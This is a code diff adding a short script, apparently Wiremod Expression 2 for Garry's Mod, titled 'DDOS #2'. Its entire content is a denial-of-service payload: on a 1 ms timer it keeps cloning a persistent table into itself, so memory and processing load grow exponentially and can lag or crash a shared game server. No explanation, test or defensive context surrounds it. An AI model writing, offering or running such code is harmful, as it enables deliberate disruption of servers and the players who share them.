@@ -1,0 +1,12 @@
+@name DDOS #2
+@inputs 
+@outputs 
+@persist T:table
+@trigger 
+
+if(first()) {
+    T:pushArray(array(entity(),owner()))
+}
+
+interval(1)
+while(perf(9)){T:pushTable(T:clone())}
